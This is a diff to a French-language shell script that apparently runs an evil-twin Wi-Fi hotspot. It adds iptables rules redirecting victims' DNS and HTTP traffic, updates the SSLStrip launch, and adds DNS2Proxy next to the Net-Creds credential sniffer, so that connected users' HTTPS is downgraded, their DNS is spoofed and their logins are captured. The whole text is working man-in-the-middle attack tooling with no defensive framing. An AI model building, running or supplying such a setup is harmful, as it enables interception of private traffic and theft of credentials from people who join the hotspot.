@@ -114,7 +114,8 @@ iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
 iptables -P FORWARD ACCEPT
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+iptables --table nat --append PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
+iptables --table nat --append PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 sleep 3
 
 # DHCP
@@ -129,8 +130,17 @@ sleep 3
 
 # SSLStrip
 echo -e "$info\n[+]Configuration et démarrage de SSLStrip $warn"
-xterm -geometry 125x30+5+500 -T SSLStripLog -e python /usr/bin/sslstrip --favicon -p -k 10000 --write sslstrip.log & sslstripid=$!
-sleep 2
+xterm -geometry 125x30+5+400 -T SSLStrip -e sslstrip --favicon -p -k 10000 --write sslstrip.log & sslstripid=$!
+sleep 3
+
+cd /etc/dns2proxy
+# DNS2Proxy
+echo -e "$info\n[+]Configuration et démarrage de DNS2Proxy $warn"
+xterm -xrm '*hold: true' -geometry 125x30+5+500 -T DNS2Proxy -e python dns2proxy.py & dns2proxyid=$!
+disown
+sleep 1
+cd /etc/myHotspot
+sleep 1
 
 # Net-Creds
 echo -e "$info\n[+]Configuration et démarrage de Net-Creds $warn"
@@ -160,8 +170,10 @@ echo -e "$info[+] DHCP stoppé $warn"
 kill ${dchpid}
 echo -e "$info[+] SSLStrip stoppé $warn"
 kill ${sslstripid}
-echo -e "$info[+] Net-Creds stoppé $info\n"
+echo -e "$info[+] Net-Creds stoppé $warn"
 kill ${netcredsid}
+echo -e "$info[+] DNS2Proxy stoppé $info\n"
+kill ${dns2proxyid}
 sleep 1
 
 echo -e "[+] Airmon-ng stoppé $txtrst\n"
